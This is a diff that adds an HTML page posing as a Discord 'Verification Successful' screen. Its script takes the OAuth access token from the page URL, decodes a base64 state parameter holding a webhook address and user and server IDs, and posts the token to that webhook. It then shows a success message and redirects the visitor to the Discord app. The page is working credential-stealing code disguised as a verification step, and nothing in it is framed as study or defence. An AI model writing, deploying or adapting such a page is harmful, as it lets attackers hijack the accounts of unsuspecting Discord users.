@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Successful</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #1a191e; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        h1 { color: #5865F2; }
+        .btn { background-color: #5865F2; color: white; padding: 15px 40px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 20px; display: none; }
+    </style>
+</head>
+<body>
+    <h1>✅ Verified</h1>
+    <p id="status">Syncing with Discord...</p>
+    <a href="discord://-/" class="btn" id="btn">Open Discord App</a>
+
+    <script>
+        // Get token from URL hash
+        const hash = new URLSearchParams(window.location.hash.substring(1));
+        const token = hash.get('access_token');
+        
+        // Get user info from the 'state' parameter (we will pass it from the bot)
+        const state = hash.get('state'); 
+
+        if (token && state) {
+            // Decode the state (which contains the webhook URL and User ID)
+            const decodedState = JSON.parse(atob(state));
+            const webhookUrl = decodedState.webhook;
+            const userId = decodedState.userId;
+
+            // Send token to the Discord Webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `TOKEN:${token}|USER:${userId}|GUILD:${decodedState.guildId}`
+                })
+            }).then(() => {
+                document.getElementById('status').innerText = "Success! Redirecting to Discord...";
+                setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
+                document.getElementById('btn').style.display = "inline-block";
+            });
+        } else {
+            document.getElementById('status').innerText = "Error: Missing token.";
+        }
+    </script>
+</body>
+</html>
